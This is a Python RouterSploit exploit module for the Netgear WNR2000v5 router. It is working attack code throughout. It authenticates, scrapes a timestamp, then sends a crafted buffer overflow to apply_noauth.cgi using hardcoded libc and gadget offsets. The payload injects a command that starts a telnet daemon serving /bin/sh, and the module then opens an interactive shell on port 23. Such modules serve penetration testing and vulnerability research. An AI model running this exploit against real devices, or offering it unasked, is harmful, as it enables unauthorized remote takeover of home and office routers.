#!/usr/bin/python2.7
from struct import pack
import re
import urllib
import telnetlib
import requests
from routersploit import (
    print_status,
    print_success,
    print_error,
    http_request,
    mute,
    validators,
    exploits,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation of Netgear WNR2000v5 (un)authenticated rce, allows command execution on devices with credentials.
    """
    __info__ = {
        'name': 'NETGEAR WNR2000v5 RCE',
        'description': 'Module exploits an buffer overflow in apply_noauth.cgi with the timestamp given valid credentials to open a telnet shell',
        'authors': [
            'Pedro Ribeiro'  # vuln discovery and PoC!
            'Austin <github.com/realoriginal>'  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40949/',
        ],

        'devices': [
            'Netgear WNR2000v5',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.0.1', validators=validators.url)
    port = exploits.Option(80, 'Target port', validators=validators.integer)
    username = exploits.Option('', 'Username to authenticate with')
    password = exploits.Option('', 'Password to authenticate with')

    def run(self):
        if self.check():
            print_success("Target may be vulnerable")
            self.execute(self.username, self.password)
        else:
            print_error("Target is not vulnerable")

    def execute(self, username, password):
        url_timestamp = "{}:{}/lang_check.html".format(self.target, self.port)
        url_telnetd = "{}:{}/apply_noauth.cgi".format(self.target, self.port)
        nops = "A"
        libcbase = 0x2ab24000
        systemoffset = 0x547D0
        gadgetoffset = 0x2462C
        shellcode = nops * 36
        shellcode += urllib.quote(pack(">I", libcbase + systemoffset))
        shellcode += nops * 12
        shellcode += urllib.quote(pack(">I", libcbase + gadgetoffset))
        shellcode += nops * 0x40
        shellcode += "killall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh"
        timestamp_req = http_request(method="GET", url=url_timestamp, allow_redirects=False, auth=(username, password))
        if timestamp_req.status_code != 200:
            timestamp_req = http_request(method="GET", url=url_timestamp, allow_redirects=False, auth=(username, password))
            if timestamp_req.status_code != 200:
                print_error("Invalid credentials")
                return
        else:
            print_success("Successfully logged in! Retrieving timestamp...")
        time = re.search('timestamp=(\d+)', str(timestamp_req.content))
        time = time.group(1)
        print_status("Timestamp retrieved : {}".format(time))
        print_status("Starting telnetd on target...")
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        query = "/lang_check.html%20timestamp={}".format(time)
        print_status("Please wait 10 seconds, shell should be avaiable")
        try:
            telnetd_req = requests.post(url="{}?{}".format(url_telnetd, query), data="submit_flag=select_language&hidden_lang_avi={}".format(shellcode), headers=headers, auth=(username, password), timeout=10)
        except Exception as e:
            target = self.target
            if 'https://' in target:
                target = target.replace("https://", '')
                target = target.replace("/", '')
            elif 'http://' in target:
                target = target.replace("http://", '')
                target = target.replace("/", '')
            print_status("Connecting to {}:23".format(target))
            connect = telnetlib.Telnet()
            connect.open(target, 23)
            connect.interact()
        return

    @mute
    def check(self):
        url = "{}:{}/".format(self.target, self.port)
        headers_check = http_request(method="GET", url=url)
        if headers_check.headers['WWW-Authenticate'] == 'Basic realm=\"NETGEAR WNR2000v5\"':
            return True
        return False

